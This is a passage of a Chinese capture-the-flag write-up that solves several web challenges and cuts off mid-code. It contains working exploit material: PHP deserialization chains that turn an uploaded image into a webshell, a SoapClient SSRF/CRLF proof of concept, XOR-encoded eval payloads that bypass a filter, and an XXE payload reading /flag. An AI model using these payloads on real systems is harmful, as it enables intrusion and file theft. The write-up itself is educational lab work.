+<p>这时候我们发现cookie里有一段像base64的编码，解密一下发现是序列化的内容</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411151627165.png" alt="image-20220411151627165"></p>
+<p>一般序列化应该都会给源码，所以找一下目录，有<a target="_blank" rel="noopener" href="http://www.tar.gz/">www.tar.gz</a></p>
+<p>主要是这几个文件</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411152330537.png" alt="image-20220411152330537"></p>
+<p>用phpstorm打开之后能发现index.php和register.php里被打了两个断点</p>
+<p>register.php</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411152628334.png" alt="image-20220411152628334"></p>
+<p>index.php</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411152643205.png" alt="image-20220411152643205"></p>
+<p>算是出题人给的提示吧，register那里是我们要利用的序列化的入口，registed和checker参数可控，让checker实例化proflie类就能调用profile里的魔术方法，实现我们后面的反序列化，而index那里能够对序列化内容进行反序列化，实现漏洞利用的目的。</p>
+<p>我们再来看看profile.php</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+namespace app\web\controller;
+
+use think\Controller;
+
+class Profile extends Controller
+&#123;
+    public $checker;
+    public $filename_tmp;
+    public $filename;
+    public $upload_menu;
+    public $ext;
+    public $img;
+    public $except;
+
+    public function __construct()
+    &#123;
+        $this-&gt;checker&#x3D;new Index();
+        $this-&gt;upload_menu&#x3D;md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
+        @chdir(&quot;..&#x2F;public&#x2F;upload&quot;);
+        if(!is_dir($this-&gt;upload_menu))&#123;
+            @mkdir($this-&gt;upload_menu);
+        &#125;
+        @chdir($this-&gt;upload_menu);
+    &#125;
+
+    public function upload_img()&#123;
+        if($this-&gt;checker)&#123;
+            if(!$this-&gt;checker-&gt;login_check())&#123;
+                $curr_url&#x3D;&quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;&#x2F;index&quot;;
+                $this-&gt;redirect($curr_url,302);
+                exit();
+            &#125;
+        &#125;
+
+        if(!empty($_FILES))&#123;
+            $this-&gt;filename_tmp&#x3D;$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+            $this-&gt;filename&#x3D;md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;
+            $this-&gt;ext_check();
+        &#125;
+        if($this-&gt;ext) &#123;
+            if(getimagesize($this-&gt;filename_tmp)) &#123;
+                @copy($this-&gt;filename_tmp, $this-&gt;filename);
+                @unlink($this-&gt;filename_tmp);
+                $this-&gt;img&#x3D;&quot;..&#x2F;upload&#x2F;$this-&gt;upload_menu&#x2F;$this-&gt;filename&quot;;
+                $this-&gt;update_img();
+            &#125;else&#123;
+                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;..&#x2F;index&#39;));
+            &#125;
+        &#125;else&#123;
+            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;..&#x2F;index&#39;));
+        &#125;
+    &#125;
+
+    public function update_img()&#123;
+        $user_info&#x3D;db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&#39;ID&#39;])-&gt;find();
+        if(empty($user_info[&#39;img&#39;]) &amp;&amp; $this-&gt;img)&#123;
+            if(db(&#39;user&#39;)-&gt;where(&#39;ID&#39;,$user_info[&#39;ID&#39;])-&gt;data([&quot;img&quot;&#x3D;&gt;addslashes($this-&gt;img)])-&gt;update())&#123;
+                $this-&gt;update_cookie();
+                $this-&gt;success(&#39;Upload img successful!&#39;, url(&#39;..&#x2F;home&#39;));
+            &#125;else&#123;
+                $this-&gt;error(&#39;Upload file failed!&#39;, url(&#39;..&#x2F;index&#39;));
+            &#125;
+        &#125;
+    &#125;
+
+    public function update_cookie()&#123;
+        $this-&gt;checker-&gt;profile[&#39;img&#39;]&#x3D;$this-&gt;img;
+        cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600);
+    &#125;
+
+    public function ext_check()&#123;
+        $ext_arr&#x3D;explode(&quot;.&quot;,$this-&gt;filename);
+        $this-&gt;ext&#x3D;end($ext_arr);
+        if($this-&gt;ext&#x3D;&#x3D;&quot;png&quot;)&#123;
+            return 1;
+        &#125;else&#123;
+            return 0;
+        &#125;
+    &#125;
+
+    public function __get($name)
+    &#123;
+        return $this-&gt;except[$name];
+    &#125;
+
+    public function __call($name, $arguments)
+    &#123;
+        if($this-&gt;&#123;$name&#125;)&#123;
+            $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments);
+        &#125;
+    &#125;
+
+&#125;</code></pre>
+
+<p>这是控制文件上传的部分</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411152858757.png" alt="image-20220411152858757"></p>
+<p>这里就是控制上传文件的文件名的位置。这里有三个if为了保证我们能成功执行，我们就必须绕过前两个if然后进入第三个。也就是让checker为0，然后修改cookie时不传文件，ext=1，这样我们就能进入第三个if中</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411163055415.png" alt="image-20220411163055415"></p>
+<p>但是这里对上传的格式有个判断，所以只能传图片了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220411180326707.png" alt="image-20220411180326707"></p>
+<p>这里是要利用图片马</p>
+<p>再看下面的copy，将filename_tmp里的内容复制到filename里</p>
+<p>而这两个变量的值是之前赋的</p>
+<pre class="language-none"><code class="language-none">$this-&gt;filename_tmp&#x3D;$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+$this-&gt;filename&#x3D;md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;</code></pre>
+
+<p>就是说在我们传文件之后，他会创造一个临时文件名保存这个文件，再创建一个md5后的文件名加上.png</p>
+<p>将这个文件的内容给到.png结尾的文件中，所以无论怎么样上传最终的文件都说.png结尾的</p>
+<p><strong>但是我们可以先传个文件，再利用序列化修改cookie来为这两个值重新赋值，因为我们只改了cookie没有传文件，也就不会进入第二个if判断中，再通过第三个if判断的copy函数让我们传的图片马变成php文件</strong></p>
+<p>既然我们找到了反序列化的起点与终点，中间的过程就可以从profile里的魔术变量下手了</p>
+<pre class="language-none"><code class="language-none">读取不可访问属性的值时，__get() 会被调用；
+在对象中调用一个不可访问方法时，__call() 会被调用。</code></pre>
+
+<p>__get()中的return $this-&gt;except[$name];name的值就是index(跟__call的两个参数的来源差不多），所以把except赋值成二维数组，键为index值为upload_img就行了</p>
+<p>所以链子是__destruct()-&gt;__call()-&gt;__get()-&gt;upload_img</p>
+<p><strong>解题步骤</strong></p>
+<p>先传图片马，然后找传上去的路径加在filename_tmp和filename里</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+
+namespace app\web\controller;
+
+use think\Controller;
+
+class Profile
+&#123;
+    public $checker &#x3D; 0;&#x2F;&#x2F;绕过第一个if判断
+    public $filename_tmp &#x3D; &#39;.&#x2F;upload&#x2F;cc551ab005b2e60fbdc88de809b2c4b1&#x2F;799bad5a3b514f096e69bbc4a7896cd9.png&#39;;
+    public $filename &#x3D; &#39;.&#x2F;upload&#x2F;cc551ab005b2e60fbdc88de809b2c4b1&#x2F;1.php&#39; ;
+    public $upload_menu;
+    public $ext &#x3D; 1;&#x2F;&#x2F;进入第三个if判断
+    public $img;
+    public $except &#x3D; array(&quot;index&quot;&#x3D;&gt;&quot;upload_img&quot;);
+&#125;
+
+class Register
+&#123;
+    public $checker;
+    public $registed &#x3D; 0;
+
+&#125;
+
+$a &#x3D; new Register();
+$a-&gt;checker &#x3D;new Profile();
+var_dump(base64_encode(serialize($a)));
+TzoyNzoiYXBwXHdlYlxjb250cm9sbGVyXFJlZ2lzdGVyIjoyOntzOjc6ImNoZWNrZXIiO086MjY6ImFwcFx3ZWJcY29udHJvbGxlclxQcm9maWxlIjo3OntzOjc6ImNoZWNrZXIiO2k6MDtzOjEyOiJmaWxlbmFtZV90bXAiO3M6Nzg6Ii4vdXBsb2FkL2NjNTUxYWIwMDViMmU2MGZiZGM4OGRlODA5YjJjNGIxLzc5OWJhZDVhM2I1MTRmMDk2ZTY5YmJjNGE3ODk2Y2Q5LnBuZyI7czo4OiJmaWxlbmFtZSI7czo0NzoiLi91cGxvYWQvY2M1NTFhYjAwNWIyZTYwZmJkYzg4ZGU4MDliMmM0YjEvMS5waHAiO3M6MTE6InVwbG9hZF9tZW51IjtOO3M6MzoiZXh0IjtpOjE7czozOiJpbWciO047czo2OiJleGNlcHQiO2E6MTp7czo1OiJpbmRleCI7czoxMDoidXBsb2FkX2ltZyI7fX1zOjg6InJlZ2lzdGVkIjtpOjA7fQ&#x3D;&#x3D;</code></pre>
+
+<p>把cookie改掉然后刷新</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220410233155520.png" alt="image-20220410233155520"></p>
+<p>会报错，但是实际已经修改成功了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220410233145938.png" alt="image-20220410233145938"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220410233226776.png" alt="image-20220410233226776"></p>
+<p>蚁剑连接，在根目录下找到flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220410233247139.png" alt="image-20220410233247139"></p>
+<h2 id="bestphp-39-s-revenge"><a href="#bestphp-39-s-revenge" class="headerlink" title="bestphp&#39;s revenge"></a>bestphp&#39;s revenge</h2><ul>
+<li>session反序列化</li>
+<li>CRLF</li>
+<li>变量覆盖</li>
+<li>PHP原生类SoapClient的SSRF。</li>
+</ul>
+<pre class="language-none"><code class="language-none">&lt;?php
+highlight_file(__FILE__);
+$b &#x3D; &#39;implode&#39;;
+call_user_func($_GET[&#39;f&#39;], $_POST);
+session_start();
+if (isset($_GET[&#39;name&#39;])) &#123;
+    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];
+&#125;
+var_dump($_SESSION);
+$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);
+call_user_func($b, $a);
+?&gt; </code></pre>
+
+<p>直接访问flag.php</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412182406433.png" alt="image-20220412182406433"></p>
+<p>发现要本地访问，再结合session_start函数，猜测是要利用session反序列化</p>
+<p><strong>session反序列化</strong></p>
+<p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。<br>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。</p>
+<p>session反序列化产生的原因是由于序列化与反序列化的处理器的不同导致的，默认是php</p>
+<p>可以用<code>ini_set(‘session.serialize_handler’, ‘php’)</code>来规定</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412182535003.png" alt="image-20220412182535003"></p>
+<p>如果先利用php_serialize处理器进行序列化，当我们传入的值为<code>|O:4:“test”:0:&#123;&#125;</code>时，序列化的结果就类似与<code>a:1:&#123;s:1:“a”;s:16:&quot;|O:4:“test”:0:&#123;&#125;&quot;;&#125;</code>，而如果用php处理器反序列化，会把a:1:{s:1:“a”;s:16:&quot;看作键名，将这段当作真正的序列化之后的结果来进行反序列化<code>O:4:“test”:0:&#123;&#125;&quot;</code></p>
+<p><strong>CRLF</strong></p>
+<p>看看p牛的文章[CRLF Injection漏洞的利用与实例分析 - phith0n (wooyun.js.org)](<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/CRLF">https://wooyun.js.org/drops/CRLF</a> Injection漏洞的利用与实例分析.html)</p>
+<p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
+<p>简单来说就是利用换行符在响应头里注入一些东西</p>
+<p><strong>SoapClient</strong></p>
+<p>这部分我直接贴别的师傅的博客内容了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412203513020.png" alt="image-20220412203513020"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412204001734.png" alt="image-20220412204001734"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102960092"> bestphp&#39;s revenge_沐目_01的博客-CSDN博客_bestphp&#39;s revenge</a></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412204644161.png" alt="image-20220412204644161"></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/153065#h2-5">从几道CTF题看SOAP安全问题 - 安全客，安全资讯平台 (anquanke.com)</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ophxc/p/13168611.html">LCTF]bestphp&#39;s revenge 给我的启发学习 - op_hxc - 博客园 (cnblogs.com)</a></p>
+<p>因为flag.php要求本地登录，所以我们如果能用反序列化调用Soapclient来访问flag.php就能得到flag</p>
+<p><strong>变量覆盖</strong></p>
+<p>extract函数会导致变量覆盖</p>
+<p>知识点了解之后再重新看index.php</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+highlight_file(__FILE__);
+$b &#x3D; &#39;implode&#39;;
+call_user_func($_GET[&#39;f&#39;], $_POST);
+session_start();
+if (isset($_GET[&#39;name&#39;])) &#123;
+    $_SESSION[&#39;name&#39;] &#x3D; $_GET[&#39;name&#39;];
+&#125;
+var_dump($_SESSION);
+$a &#x3D; array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);
+call_user_func($b, $a);
+?&gt; </code></pre>
+
+<p>要在调用Soapclient反序列化，就要有一个不存在的方法被调用，而extract可以导致变量覆盖，那我们就利用第一个回调函数，将b赋值为call_user_func，如果传入的参数是 array 型的化，会将数组的成员当作 <code>类名</code> 和 <code>方法名</code>。此时第二个回调函数的内容为</p>
+<pre class="language-none"><code class="language-none">call_user_func(call_user_func(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;))</code></pre>
+
+<p>关于reset函数：reset() 函数将内部指针指向数组中的第一个元素，并输出。<br>在这里就相当于<code>$_SESSION[&#39;name&#39;]</code></p>
+<p>我们只要传入name=Soapclient就能将这段语句变为</p>
+<p>call_user_func(call_user_func(array(Soapclient,&#39;welcome_to_the_lctf2018&#39;)));因为Soapclient显然没有welcome_to_the_lctf2018这个方法，也就会调用其中的_call方法，触发反序列化</p>
+<p><strong>在修改序列化引擎的部分</strong></p>
+<p>正常的话，比如我们在入门PHP的session反序列化的时候，改变php引擎的方法是ini_set（）函数，但是这个函数不接受数组，call_user_func($_GET[&#39;f&#39;], $_POST);而这里的post超级全局变量是一个数组，所以ini_set就不行了，于是使用session_start来代替，同时呢session.serialize_handler = php_serialize也变成了serialize_handler=php_serialize。</p>
+<p><strong>poc</strong></p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+$target &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;;
+$attack &#x3D; new SoapClient(null,array(&#39;location&#39; &#x3D;&gt; $target,
+    &#39;user_agent&#39; &#x3D;&gt; &quot;test\r\nCookie: PHPSESSID&#x3D;96sujaq7o5tl0btee8urnlsrb3\r\n&quot;,
+    &#39;uri&#39; &#x3D;&gt; &quot;123&quot;));
+$payload &#x3D; urlencode(serialize($attack));
+echo $payload;
+&#x2F;&#x2F;O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22test%0D%0ACookie%3A+PHPSESSID%3D96sujaq7o5tl0btee8urnlsrb3%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412211949816.png" alt="image-20220412211949816"></p>
+<p>然后我们再通过</p>
+<p>extract来实现触发反序列化的操作</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412212102110.png" alt="image-20220412212102110"></p>
+<p>这实际上已经成功了，相当于用一个PHPSESSID=96sujaq7o5tl0btee8urnlsrb的账号访问到了flag.php，接下来我们只要将cookie改为这个就行了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412212725115.png" alt="image-20220412212725115"></p>
+<p>再session反序列化的时候不知道为啥用自己的会有些问题，导致连接超时，但是换成另外的就不会这样，上面那个就是用自己cookie的结果，卡了好久，然后再刷新的时候环境都打不开了</p>
+<p>这是用其他的cookie的结果</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412213433110.png" alt="image-20220412213433110"></p>
+<h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><p>这题第二个if判断可太恶心人了</p>
+<pre class="language-none"><code class="language-none">&lt;?php
+highlight_file(__FILE__);
+
+$_ &#x3D; @$_GET[&#39;_&#39;];
+if ( preg_match(&#39;&#x2F;[\x00- 0-9\&#39;&quot;&#96;$&amp;.,|[&#123;_defgops\x7F]+&#x2F;i&#39;, $_) )
+    die(&#39;rosé will not do it&#39;);
+
+if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )
+    die(&#39;you are so close, omg&#39;);
+
+eval($_);
+?&gt;</code></pre>
+
+<p>绕过两个if就能成功执行命令，但是第一个if正则匹配了不少东西</p>
+<pre class="language-none"><code class="language-none">\x00- 0-9                       匹配\x00到空格(\x20)，0-9的数字
+&#39;&quot;&#96;$&amp;.,|[&#123;_defgops              匹配这些字符
+\x7F                            匹配DEL(\x7F)字符</code></pre>
+
+<p>可以用这个网站看看<a target="_blank" rel="noopener" href="https://regex101.com/">https://regex101.com/</a></p>
+<p>既然^和~符号没被过滤，很容易想到异或和取反绕过，先取反看看phpinfo</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220413175001715.png" alt="image-20220413175001715"></p>
+<p>一些命令执行函数不能用，但是还有scandir那些，可以用scandir配合print_f来读取目录</p>
+<p>这时候就要绕过第二个if了，要求出现的字符种类不超过13个，而（）^;这已经四个了，也就是我们能控制的字符只有九个，用异或还要有一个%ff，这下只有八个了</p>
+<p>先上脚本</p>
+<pre class="language-none"><code class="language-none">str &#x3D; &#39;acdips&#39;
+target &#x3D; &#39;ntrfl&#39;
+for m in target:
+    for a in str:
+        for b in str:
+            for c in str:
+                if ord(a) ^ ord(b) ^ ord(c) &#x3D;&#x3D; ord(m):
+                    print(&quot;&#123;&#125; &#x3D; &#123;&#125;^&#123;&#125;^&#123;&#125;&quot;.format(m, a, b, c), )
+                    print(&quot;&#123;&#125; &#x3D; &#123;&#125;^&#123;&#125;^&#123;&#125;&quot;.format(hex(~ord(m) &amp; 0xff), hex(~ord(a) &amp; 0xff), hex(~ord(b) &amp; 0xff),hex(~ord(c) &amp; 0xff)))</code></pre>
+
+<p>这是其他师傅的解释</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220413175440905.png" alt="image-20220413175440905"></p>
+<p>接下来就是对照着脚本将字符替换掉就行了</p>
+<pre class="language-none"><code class="language-none">((%8f%9c%96%9c%9c%a0%9c)^(%8f%9e%96%9b%9b%a0%9e)^(%8f%8f%96%96%8c%a0%8f)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%9e)^(%8c%9c%9e%96%9b%96%9c)^(%8c%9c%9e%9c%9b%96%8f)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</code></pre>
+
+
+
+<p><img src="/2022/01/19/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/Users/ethe/AppData/Roaming/Typora/typora-user-images/image-20220413151805073.png" alt="image-20220413151805073"></p>
+<p>看到了flag文件，在最后一个，所以用end将指针指向最末尾的文件，然后利用readfile或者show_source读就行了</p>
+<p>payload</p>
+<pre class="language-none"><code class="language-none">((%9e%9a%9e%9b%9e%96%9e%9a)^(%9c%9a%9e%9b%9c%96%96%9a)^(%8f%9a%9e%9b%9b%96%9b%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff))(((%9a%9c%9b)^(%9a%9b%9b)^(%9a%96%9b)^(%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%9e)^(%8c%9c%9e%96%9b%96%9c)^(%8c%9c%9e%9c%9b%96%8f)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220413175809750.png" alt="image-20220413175809750"></p>
+<h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p>文件上传的题，不过不是传一句话，而是传xml文件，利用xxe来读flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220417211118004.png" alt="image-20220417211118004"></p>
+<p>通过提示知道flag在/flag里，</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220417211146823.png" alt="image-20220417211146823"></p>
+<p>再配合这个上传示例，可以写一个xml的文件</p>
+<pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;
+&lt;!DOCTYPE users [
+&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;
+&lt;users&gt;
+    &lt;user&gt;
+        &lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;
+        &lt;password&gt;&amp;xxe;&lt;&#x2F;password&gt;
+        &lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;
+        &lt;email&gt;&amp;xxe;&lt;&#x2F;email&gt;  
+        &lt;group&gt;&amp;xxe;&lt;&#x2F;group&gt;
+        &lt;intro&gt;&amp;xxe;&lt;&#x2F;intro&gt;
+    &lt;&#x2F;user&gt;
+&lt;&#x2F;users&gt;</code></pre>
+
+<p>但是这里的过滤不知道是通过什么方式的，通过utf-16编码就可以绕过，utf-8就不行，所以windows可以用记事本写完之后另存为utf-16的格式，Linux就是利用<code>iconv -f utf8 -t utf-16 2.xml&gt;1.xml</code>的命令把utf-8转化为utf-16</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220417211659665.png" alt="image-20220417211659665"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220417211720623.png" alt="image-20220417211720623"></p>
+<h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p>原型链污染和js的大小写特性</p>
+<p>存在源码泄露，<a target="_blank" rel="noopener" href="http://www.zip下载源码,主要是看路由的部分/">www.zip下载源码，主要是看路由的部分</a></p>
+<pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> <span class="token function-variable function">isObject</span> <span class="token operator">=</span> <span class="token parameter">obj</span> <span class="token operator">=></span> obj <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">.</span>constructor <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Object<span class="token punctuation">;</span>
+<span class="token keyword">const</span> <span class="token function-variable function">merge</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> attr <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isObject</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isObject</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+      a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> a
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">const</span> <span class="token function-variable function">clone</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">function</span> <span class="token function">safeKeyword</span><span class="token punctuation">(</span><span class="token parameter">keyword</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>keyword<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(admin)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">is</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">return</span> keyword
+  <span class="token punctuation">&#125;</span>
+
+  <span class="token keyword">return</span> <span class="token keyword">undefined</span>
+<span class="token punctuation">&#125;</span>
+
